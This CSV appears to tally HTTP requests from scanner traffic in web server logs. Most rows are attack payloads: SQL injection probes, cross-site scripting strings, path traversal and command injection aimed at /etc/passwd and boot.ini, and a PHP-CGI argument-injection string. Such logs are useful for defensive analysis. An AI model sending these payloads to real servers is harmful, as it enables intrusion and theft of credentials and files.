Frequency,Resource
2,pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,flexform.cgi
1,/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
2,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
1,Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
1,/main.php?basepath=-9750%29%29%29%20ORDER%20BY%205%23
1,modules/vwar/admin/config.php
1,gH.cgi
1,/admin/config.php
1,/TvLBvkHh.it
1,/main.php?basepath=-8400%20OR%205746%3D5746%23
1,/nsn/..%5Cutil/md.bas
1,/php/php.exe?c:\boot.ini
1,/TvLBvkHh.htpasswd
1,htsearch?exclude=%60/etc/passwd%60
1,/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd
1,/vgn/jsp/jspstatus
1,/cgi-bin/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/chat/!pwds.txt
1,//../../../../../../../../../../boot.ini
1,/provision/
1,ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
2,/www/phpMyAdmin/index.php
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%29%29%20OR%20NOT%207457%3D2378%23
1,/cgi-bin/cgiwrap
1,//cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
1,/rtm.log
1,post32.exe%7Cdir%20c:%5C%5C
1,/webcart/orders/import.txt
1,/albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd
1,/ariadne/
1,/................../etc/passwd
1,/junk988.aspx
1,html2wml.cgi
2,/claroline/phpMyAdmin/index.php
1,/cgi-bin/WS_FTP.ini
2,/index.asp
1,/cfdocs/expeval/sendmail.cfm
1,LWGate
1,/cgi-bin/opendir.php?/etc/passwd
1,/forums//adm/config.php
2,cgiwrap/~adm
1,/main.php?basepath=%29%29%20AS%20xbpU%20WHERE%204670%3D4670%20AND%208487%3D6807%23
1,/phpmyadmin1/index.php
2,/admin/phpmyadmin2/index.php
1,spin_client.cgi?aaaaaaaa
1,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
1,/index.php?sql_debug=1
1,/cisco/
1,/main.php?basepath=-3702%29%29%29%20UNION%20ALL%20SELECT%206827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%2C6827%23
2,/hostadmin/?page='
1,/recordings/theme/iefixes.css
1,/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-7467%29%29%29%20UNION%20ALL%20SELECT%208023%2C8023%2C8023%2C8023%2CCONCAT%280x716a6b7671%2C0x4945706659676d454d70%2C0x71627a6a71%29%23
1,/basilix/compose-attach.php3
1,/securecontrolpanel/
1,/polycomvvx/
1,/vgn/asp/MetaDataUpdate
1,common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/html/cgi-bin/cgicso?query=AAA
1,/main.php?basepath=-4539%20OR%201902%3D7936%23
1,publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/ows-bin/
1,/scripts/db4web_c.exe/dbdirname/c:%5Cboot.ini
1,/guestbook/guestbookdat
1,fom.cgi?file=<script>alert('Vulnerable')</script>
1,/support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,title.cgi
1,/TvLBvkHh.render_css
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,/vgn/performance/TMT/reset
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20CONCAT%280x716a6b7671%2C0x6a456266564b434e5074%2C0x71627a6a71%29%2C9817%2C9817%2C9817%2C9817%23
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx?aspxerrorpath=null
1,/w-agora/
1,/main.php?basepath=-6715%27%29%29%20OR%205746%3D5746%23
3,//phpMyAdmin/scripts/setup.php
1,/main.php?basepath=-4517%29%29%29%20UNION%20ALL%20SELECT%207675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%2C7675%23
1,/TvLBvkHh.txt
1,/athenareg.php?pass=%20;cat%20/etc/passwd
1,/TvLBvkHh.sqlite
2,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/ca/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C/%5C%5Cetc/%5C%5Cpasswd
1,/main.php?basepath=-7298%22%29%29%20OR%205431%3D8902%23
1,mgrqcgi
1,/webtop/wdk/
1,/TvLBvkHh.iso8859-2
1,/TvLBvkHh.vts
1,/main.php?basepath=%29%29%29%20OR%20UPDATEXML%282604%2CCONCAT%280x2e%2C0x716a6b7671%2C%28SELECT%20%28ELT%282604%3D2604%2C1%29%29%29%2C0x71627a6a71%29%2C3885%29%20AND%20%28%28%283828%3D3828
1,/TvLBvkHh.iso8859-8
2,cgiwrap/~mysql
1,/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,admin/setup.cgi
1,/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/config/
1,/newuser?Image=../../database/rbsserv.mdb
1,/TvLBvkHh.xbb
1,/hmstat.htm
1,update.dpgs
1,/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd
1,technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,/TvLBvkHh.ee
1,/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22
1,/main.php?basepath=%25%27%20AND%206781%3D5822%20AND%20%27%25%27%3D%27
1,/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/webmail/
1,cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/main.php?basepath=%29%29%20AND%201138%3D5331%23
1,/cgi-bin/bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/ows/restricted.show
1,mt-static/mt-check.cgi
1,/administrator/config.php
1,/cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/shopping400.mdb
1,viewsource?/etc/passwd
1,/_cti_pvt/
1,/main.php?basepath=%29%29%29%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29LTlt%29%20AND%20%28%28%284324%3D4324
1,/main.php?basepath=%27%29%20AND%203444%3D8412%23
4,/index.action
1,/cgi-bin/admin/admin.cgi
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,infosrch.cgi
1,/main.php?basepath=-8642%27%20OR%205371%3D9884%23
1,/cgi-bin/.cobalt
1,/TvLBvkHh.SHOW
1,/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
1,/main.php?basepath=%60%20WHERE%202314%3D2314%20AND%203093%3D6426%23
1,/cgi-bin/mkilog.exe
6,/wls-wsat/CoordinatorPortType
1,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>"
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,php.cgi?/etc/passwd
1,/index.php?page=../../../../../../../../../../boot.ini
1,/jgb_eng_php3/cfooter.php3
1,/cgi-bin/vpasswd.cgi
1,/cgi-bin/awstats.pl
1,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;
1,/main.php?basepath=-6783%29%29%20AS%20DuAZ%20WHERE%207754%3D7754%20OR%203928%3D5215%23
1,/anthill/login.php
1,/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/calendar.pl
1,/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
1,/main.php?basepath=%25%22%29%29%20AND%208399%3D8068%23
1,/home.php?arsc_language=elvish
1,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/TvLBvkHh.conf
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd
1,/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-5325%25%22%29%29%29%20OR%205746%3D5746%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
1,mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
1,/cgi-bin/ImageFolio/admin/admin.cgi
1,/webcart/carts/
1,moin.cgi?test
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%207163%2C7163%2C7163%2C7163%2CCONCAT%280x716a6b7671%2C0x6655715550694c7753524e5578666b5555726368716a564f59667a52534e50746f4b634a42535a4f%2C0x71627a6a71%29%23
1,/blah_badfile.shtml
1,"/cgi-bin/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3"
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
2,/cgi-bin/cgiwrap/~web
1,/main.php?basepath=-4774%22%29%20OR%205746%3D5746%23
1,input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/main.php?basepath=%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%281063%2CCONCAT%280x5c%2C0x716a6b7671%2C%28SELECT%20%28CASE%20WHEN%20%281063%3D1063%29%20THEN%201%20ELSE%200%20END%29%29%2C0x71627a6a71%29%29%2C1%29%20AND%20%28%28%282600%3D2600
1,/TvLBvkHh.pwd
1,/TvLBvkHh.de
1,redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E
1,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
1,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,"/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,nph-error.pl
1,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
1,perl?-v
1,/cgi-bin/ss
1,/TvLBvkHh.db
1,/cgi.cgi/
1,/cgi/
1,/main.php?basepath=-7485%25%27%29%29%29%20OR%205746%3D5746%23
1,/phpmyadmin/config.php
1,/instantwebmail/message.php
1,/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
1,/cgi-bin/gH.cgi
1,/addressbook/index.php?name=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.js
1,/cgi-bin/betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/Xcelerate/LoginPage.html
1,/node/view/666%5C%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
2,cgiwrap/~noaccess
1,/cgi-bin/aglimpse.cgi
2,/cgi-bin/cart.pl?db='
2,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
1,/nsn/..%5Cweb/fdir.bas
1,ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,test-cgi.tcl
1,/scripts/samples/search/filetime.idq
1,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2,/cgi-bin/cgiwrap/~smmsp
1,/TvLBvkHh.btr
1,/TvLBvkHh.old
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%23
1,/phpEventCalendar/file_upload.php
1,/cgi-bin/calendar
2,cgiwrap/~guest
8,/main.php?basepath=
1,/cgi-bin/stats/statsbrowse.asp?filepath=c:\&Opt=3
1,/phpMyadmin_bak/index.php
1,/../../../../../../../etc/passwd
1,/smg_Smxcfg30.exe?vcc=3560121183d3
1,/xml/
1,/TvLBvkHh.html
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink
1,/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp
1,/webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSPStoreType=image/gif
1,/cgi-bin/bigconf.cgi
1,/upload.asp
1,/cgi-bin/mt/mt.cfg
1,/main.php?basepath=-4937%25%27%29%29%20OR%207124%3D6860%23
1,guestbook.cgi
1,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>"
1,/phpping/index.php?pingto=www.test.com%20|%20dir%20c:\\
1,/digium/
2,/cgi-bin/pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/cgi-bin/ws_ftp.ini
1,data/fetch.php?page=
1,dcshop/orders/orders.txt
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
2,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
1,/index.shtml
1,/script%3Ealert('Vulnerable')%3C/script%3E.cfm
1,/grandstream/
1,/cgi-bin-sdb/printenv
1,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtml
1,/cgi-bin/wwwadmin.pl
1,/main.php?basepath=-4399%22%29%29%20AS%20eDsz%20WHERE%205649%3D5649%20OR%207971%3D5361%23
1,/simplebbs/users/users.php
1,/default.asp
1,/TvLBvkHh.xsql
1,/TvLBvkHh.utf8
1,/chassis/config/GeneralChassisConfig.html
1,/main.php?basepath=-9013%25%22%29%20OR%204002%3D6141%23
1,/main.php?basepath=%20AND%204838%3D9991--%20mgXC
1,/vgn/jsp/jspstatus56
1,/TvLBvkHh.apw
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/farm/libs/modules/tween/tween.min.js
1,cachemgr.cgi
1,/cfdocs/snippets/evaluate.cfm
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
13,/manager/html
1,/gxp280/
1,/fcgi-bin/
1,/main.php?basepath=%29%29%29%20RLIKE%20SLEEP%285%29%23
1,/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
1,/cbms/editclient.php
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.SSIFilter
1,/main.php?basepath=%27%20IN%20BOOLEAN%20MODE%29%20AND%202762%3D9644%23
1,/main.php?basepath=-2185%22%29%20OR%205746%3D5746%23
1,/cgi-bin/moin.cgi?test
1,/blah123.php
1,/cgi-bin/echo.bat
1,/cgi-bin/search
1,/main.php?basepath=%29%29%20AND%201916%3D1916%23
1,/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/ibill.pm
1,/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/main.php?basepath=-5709%20OR%205746%3D5746%23
1,/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-3481%27%29%29%29%20OR%203469%3D9633%23
1,"/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script>"
1,/pap2/
1,query?mss=%2e%2e/config
1,/TvLBvkHh.php3+
1,WS_FTP.ini
1,/eng/start/StatPtrGen.htm
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/phprocketaddin/?page=../../../../../../../../../../boot.ini
1,/TvLBvkHh.config~
1,/guestbook/admin.php
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23
1,/typo3conf/localconf.php
1,/cgi-bin/shop/orders/orders.txt
1,/ticket.php?id=99999
1,/TvLBvkHh.wwwacl
1,/gallery/search.php?searchstring=<script>alert(document.cookie)</script>
1,/search/htx/SQLQHit.asp
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
